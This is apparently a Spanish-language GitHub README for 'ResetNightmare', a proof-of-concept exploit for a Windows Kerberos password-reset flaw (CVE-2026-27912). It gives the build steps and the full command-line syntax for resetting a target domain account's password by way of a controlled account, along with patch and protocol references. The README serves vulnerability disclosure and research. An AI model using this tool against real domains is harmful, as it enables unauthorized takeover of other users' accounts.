

<img width="2172" height="724" alt="resetnightmare-banner" src="https://github.com/user-attachments/assets/d2659039-429a-4599-83e6-e16407fdfcb8" />


# ResetNightmare

**ResetNightmare**, [CVE-2026-27912](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-27912), fue descubierta por **Shai Laron**, investigador de [Semperis](https://www.linkedin.com/company/semperis/). Más información en [@SemperisTech](https://x.com/semperistech).


## Modo de uso

El PoC se compila para Windows x64 mediante MinGW-w64. El `Makefile` genera `resetnightmare_rajkitpoc.exe`.

```bash
cd POC
make
```
La sintaxis soportada por el cliente es:

```powershell
.\resetnightmare_rajkitpoc.exe `
    --t <target-account> `
    --u <controlled-account> `
    --controlled-password <controlled-password> `
    --new-target-password <new-target-password> `
    --d <domain-controller> `
    --e AES256 `
    --execute
```

| Parámetro | Descripción |
|---|---|
| `--t` | Cuenta objetivo |
| `--u` | Cuenta controlada cuyo `userPrincipalName` puede modificarse |
| `--controlled-password` | Contraseña de la cuenta controlada |
| `--new-target-password` | Nueva contraseña destinada a la cuenta objetivo |
| `--d` | Controlador de dominio, si se omite el cliente intenta descubrirlo automáticamente |
| `--e` | Tipo de cifrado, `AES256`, `AES128` o `RC4` |
| `--execute` | Habilita la ejecución del flujo |
| `--print-Ticket` | Muestra el `KRB-CRED` obtenido durante la ejecución |


## Blog de investigacion


https://www.jellybeesystem.com/blogs/windows-internals/ResetNightmare-CVE-2026-27912/



## Videos ejecución

https://github.com/user-attachments/assets/49b3feae-6b8a-4ed1-a054-185012da9fe7



https://github.com/user-attachments/assets/fe5a662f-2838-44c6-b350-3af989a201aa




## Referencias

- [Microsoft Security Response Center — CVE-2026-27912](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-27912)
- [CVE.org — CVE-2026-27912](https://www.cve.org/CVERecord?id=CVE-2026-27912)
- [Semperis-Community — ResetNightmare](https://github.com/Semperis-Community/ResetNightmare)
- [Semperis — Shai Laron y ResetNightmare](https://www.semperis.com/es/press-release/semperis-takes-center-stage-at-black-hat-usa/)
- [RFC 3244 — Kerberos Change Password and Set Password Protocols](https://www.rfc-editor.org/rfc/rfc3244)
- [MS-PAC — PAC_INFO_BUFFER](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/3341cfa2-6ef5-42e0-b7bc-4544884bf399)
- [MS-PAC — KERB_VALIDATION_INFO](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-7d969cd0ed73)
- [KB5078766 — Windows Server 2022, OS Build 20348.4893](https://support.microsoft.com/help/5078766)
- [KB5082142 — Windows Server 2022, OS Build 20348.5020](https://support.microsoft.com/help/5082142)
